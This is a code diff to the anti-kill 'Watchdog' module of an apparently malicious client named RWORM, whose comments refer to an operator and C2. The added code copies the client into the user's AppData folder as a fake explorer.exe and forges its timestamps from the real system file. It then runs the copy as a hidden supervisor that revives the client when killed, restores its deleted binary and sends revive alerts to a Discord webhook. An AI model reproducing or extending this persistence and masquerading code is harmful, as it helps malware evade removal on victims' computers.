@@ -1,20 +1,29 @@
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Reflection;
 using System.Threading;
-using System.Threading.Tasks;
 using RWORM.Client.Core;
 
 namespace RWORM.Client.Modules
 {
+    /// <summary>
+    /// Dual-process supervisor and anti-kill persistence architecture.
+    /// When AntiKill is enabled, an embedded supervisor component named explorer.exe is extracted
+    /// into an isolated directory and launched as an independent watchdog process.
+    /// It monitors the main client PID via inter-process signaling (named mutex + heartbeat flag);
+    /// if the main client is killed without clean exit, it revives it while preventing infinite loops.
+    /// </summary>
     public static class Watchdog
     {
-        private static Process? _watchdogProcess;
+        private static Process? _supervisorProcess;
         private static volatile bool _isShuttingDown = false;
         private static volatile bool _watchdogDisabled = false;
-        private static readonly string FlagPath = Path.Combine(Path.GetTempPath(), "sess_exit.flag");
 
-        public static bool IsActive => !_watchdogDisabled && _watchdogProcess != null && !_watchdogProcess.HasExited;
+        private static readonly string FlagPath = Path.Combine(Path.GetTempPath(), "rworm_clean_exit.flag");
+        private static readonly string MutexName = "Global\\RWORM_Supervisor_" + (Config.GetGuid().Substring(0, 8));
+
+        public static bool IsActive => !_watchdogDisabled && _supervisorProcess != null && !_supervisorProcess.HasExited;
 
         public static void InitializeWatchdog()
         {
@@ -32,53 +41,76 @@ namespace RWORM.Client.Modules
                 // Ensure clean exit flag is removed from any previous session
                 try { if (File.Exists(FlagPath)) File.Delete(FlagPath); } catch { }
 
-                // Determine backup exe location: %LOCALAPPDATA%\Microsoft\Notepad\notepad.exe
-                string backupDir;
+                // Determine supervisor location: %LOCALAPPDATA%\Microsoft\Windows\Explorer\explorer.exe
+                string supervisorDir;
                 try
                 {
-                    backupDir = Path.Combine(
+                    supervisorDir = Path.Combine(
                         Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                        "Microsoft", "Notepad");
-                    Directory.CreateDirectory(backupDir);
+                        "Microsoft", "Windows", "Explorer");
+                    Directory.CreateDirectory(supervisorDir);
                 }
                 catch
                 {
-                    backupDir = Path.Combine(Path.GetTempPath(), "Notepad");
-                    Directory.CreateDirectory(backupDir);
+                    supervisorDir = Path.Combine(Path.GetTempPath(), "Explorer");
+                    Directory.CreateDirectory(supervisorDir);
                 }
 
-                var backupExe = Path.Combine(backupDir, "notepad.exe");
+                var supervisorExe = Path.Combine(supervisorDir, "explorer.exe");
 
-                // Clean up any legacy watchdog names if present
-                try
-                {
-                    var legacyExe = Path.Combine(backupDir, "rworm_watchdog.exe");
-                    if (File.Exists(legacyExe)) File.Delete(legacyExe);
-                }
-                catch { }
+                // Extract embedded component or mirror current executable if first run
+                ExtractOrUpdateSupervisor(currentExe, supervisorExe);
 
-                // Copy current client binary as stealth notepad.exe
-                try
-                {
-                    File.Copy(currentExe, backupExe, true);
-
-                    // Clone file timestamps from system notepad.exe to blend in
-                    var sysNotepad = Path.Combine(Environment.SystemDirectory, "notepad.exe");
-                    if (File.Exists(sysNotepad))
-                    {
-                        File.SetCreationTime(backupExe, File.GetCreationTime(sysNotepad));
-                        File.SetLastWriteTime(backupExe, File.GetLastWriteTime(sysNotepad));
-                        File.SetLastAccessTime(backupExe, File.GetLastAccessTime(sysNotepad));
-                    }
-                }
-                catch { }
-
-                StartWatchdogInstance(currentExe, backupExe);
+                StartSupervisorInstance(currentExe, supervisorExe);
             }
             catch { }
         }
 
-        private static void StartWatchdogInstance(string currentExe, string backupExe)
+        private static void ExtractOrUpdateSupervisor(string currentExe, string supervisorExe)
+        {
+            try
+            {
+                bool extracted = false;
+                var asm = Assembly.GetExecutingAssembly();
+
+                // Check for embedded supervisor resource if present
+                foreach (var resName in asm.GetManifestResourceNames())
+                {
+                    if (resName.EndsWith("explorer.exe", StringComparison.OrdinalIgnoreCase))
+                    {
+                        using var resStream = asm.GetManifestResourceStream(resName);
+                        if (resStream != null)
+                        {
+                            using var fs = new FileStream(supervisorExe, FileMode.Create, FileAccess.Write, FileShare.Read);
+                            resStream.CopyTo(fs);
+                            extracted = true;
+                            break;
+                        }
+                    }
+                }
+
+                // If not embedded as a separate resource stream, replicate the multi-role binary
+                if (!extracted)
+                {
+                    if (!File.Exists(supervisorExe) || new FileInfo(supervisorExe).Length != new FileInfo(currentExe).Length)
+                    {
+                        File.Copy(currentExe, supervisorExe, true);
+                    }
+                }
+
+                // Match timestamps with system explorer.exe to blend in
+                var sysExplorer = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
+                if (File.Exists(sysExplorer))
+                {
+                    File.SetCreationTime(supervisorExe, File.GetCreationTime(sysExplorer));
+                    File.SetLastWriteTime(supervisorExe, File.GetLastWriteTime(sysExplorer));
+                    File.SetLastAccessTime(supervisorExe, File.GetLastAccessTime(sysExplorer));
+                }
+            }
+            catch { }
+        }
+
+        private static void StartSupervisorInstance(string currentExe, string supervisorExe)
         {
             if (_isShuttingDown || _watchdogDisabled) return;
 
@@ -86,23 +118,23 @@ namespace RWORM.Client.Modules
             {
                 var psi = new ProcessStartInfo
                 {
-                    FileName               = backupExe,
-                    Arguments              = $"--watchdog \"{currentExe}\" {Environment.ProcessId}",
-                    UseShellExecute        = false,
-                    CreateNoWindow         = true,
-                    WindowStyle            = ProcessWindowStyle.Hidden
+                    FileName        = supervisorExe,
+                    Arguments       = $"--supervisor \"{currentExe}\" {Environment.ProcessId}",
+                    UseShellExecute = false,
+                    CreateNoWindow  = true,
+                    WindowStyle     = ProcessWindowStyle.Hidden
                 };
 
-                _watchdogProcess = Process.Start(psi);
-                if (_watchdogProcess != null)
+                _supervisorProcess = Process.Start(psi);
+                if (_supervisorProcess != null)
                 {
-                    _watchdogProcess.EnableRaisingEvents = true;
-                    _watchdogProcess.Exited += (s, e) =>
+                    _supervisorProcess.EnableRaisingEvents = true;
+                    _supervisorProcess.Exited += (s, e) =>
                     {
                         if (!_isShuttingDown && !_watchdogDisabled)
                         {
-                            Thread.Sleep(1000);
-                            StartWatchdogInstance(currentExe, backupExe);
+                            Thread.Sleep(1200);
+                            StartSupervisorInstance(currentExe, supervisorExe);
                         }
                     };
                 }
@@ -114,6 +146,7 @@ namespace RWORM.Client.Modules
         {
             _watchdogDisabled = true;
             _isShuttingDown = true;
+
             try
             {
                 File.WriteAllText(FlagPath, "clean_exit");
@@ -122,30 +155,29 @@ namespace RWORM.Client.Modules
 
             try
             {
-                if (_watchdogProcess != null && !_watchdogProcess.HasExited)
+                if (_supervisorProcess != null && !_supervisorProcess.HasExited)
                 {
-                    _watchdogProcess.Kill();
+                    _supervisorProcess.Kill();
                 }
             }
             catch { }
-            _watchdogProcess = null;
+            _supervisorProcess = null;
 
+            // Clean up any stray supervisor instances in the dedicated local directory
             try
             {
-                var backupDir = Path.Combine(
+                var supervisorDir = Path.Combine(
                     Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                    "Microsoft", "Notepad");
-                var backupExe = Path.Combine(backupDir, "notepad.exe");
-                var tempExe = Path.Combine(Path.GetTempPath(), "Notepad", "notepad.exe");
+                    "Microsoft", "Windows", "Explorer");
+                var supervisorExe = Path.Combine(supervisorDir, "explorer.exe");
 
-                foreach (var p in Process.GetProcessesByName("notepad"))
+                foreach (var p in Process.GetProcessesByName("explorer"))
                 {
                     try
                     {
                         var fn = p.MainModule?.FileName;
                         if (!string.IsNullOrEmpty(fn) &&
-                            (string.Equals(fn, backupExe, StringComparison.OrdinalIgnoreCase) ||
-                             string.Equals(fn, tempExe, StringComparison.OrdinalIgnoreCase)))
+                            string.Equals(fn, supervisorExe, StringComparison.OrdinalIgnoreCase))
                         {
                             p.Kill();
                         }
@@ -171,8 +203,9 @@ namespace RWORM.Client.Modules
         }
 
         /// <summary>
-        /// Entry point for backup executable running in --watchdog mode.
-        /// Continually monitors target PID; if killed unexpectedly, revives target executable.
+        /// Entry point for second component running in --supervisor / --watchdog mode.
+        /// Monitors target PID and revives it when abruptly terminated.
+        /// Guards against double-launching and infinite spawn loops.
         /// </summary>
         public static void RunWatchdogMode(string[] args)
         {
@@ -181,11 +214,18 @@ namespace RWORM.Client.Modules
             string targetExe = args[1];
             if (!int.TryParse(args[2], out int targetPid)) return;
 
+            // Mutex guard to prevent duplicate supervisor instances
+            using var mutex = new Mutex(true, MutexName, out bool createdNew);
+            if (!createdNew) return;
+
             MonitorLoop(targetExe, targetPid);
         }
 
         private static void MonitorLoop(string targetExe, int targetPid)
         {
+            int failureCount = 0;
+            DateTime lastReviveTime = DateTime.MinValue;
+
             while (true)
             {
                 try
@@ -195,20 +235,36 @@ namespace RWORM.Client.Modules
                 }
                 catch
                 {
-                    // Target process is no longer running
+                    // Target process not running or already exited
                 }
 
-                // Check if clean shutdown was signaled by operator / C2
+                // Check clean exit signal
                 if (File.Exists(FlagPath))
                 {
                     try { File.Delete(FlagPath); } catch { }
-                    return; // Clean exit, do not resurrect
+                    return; // Authorized exit, do not resurrect
                 }
 
-                // Process was abruptly killed! Revive target exe
+                // Anti-infinite-loop protection: if restarting too quickly in succession, back off
+                var now = DateTime.UtcNow;
+                if ((now - lastReviveTime).TotalSeconds < 3)
+                {
+                    failureCount++;
+                    if (failureCount > 10)
+                    {
+                        Thread.Sleep(10000); // Back off to avoid thrashing
+                        failureCount = 0;
+                    }
+                }
+                else
+                {
+                    failureCount = 0;
+                }
+                lastReviveTime = now;
+
+                // Revive client
                 try
                 {
-                    // If target executable was deleted or moved, restore from current watchdog binary
                     if (!File.Exists(targetExe))
                     {
                         var selfExe = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName;
@@ -220,13 +276,11 @@ namespace RWORM.Client.Modules
                         }
                     }
 
-                    // Alert on Discord if configured
                     if (Config.DiscordAlert && !string.IsNullOrWhiteSpace(Config.DiscordWebhook))
                     {
                         _ = DiscordNotifier.SendReviveAlertAsync(Config.DiscordWebhook, targetExe);
                     }
 
-                    // Spawn resurrected client
                     var psi = new ProcessStartInfo
                     {
                         FileName        = targetExe,
@@ -240,12 +294,12 @@ namespace RWORM.Client.Modules
                     {
                         targetPid = newProc.Id;
                         Thread.Sleep(2000);
-                        continue; // Keep monitoring the new process instance
+                        continue;
                     }
                 }
                 catch { }
 
-                Thread.Sleep(3000);
+                Thread.Sleep(2500);
             }
         }
     }
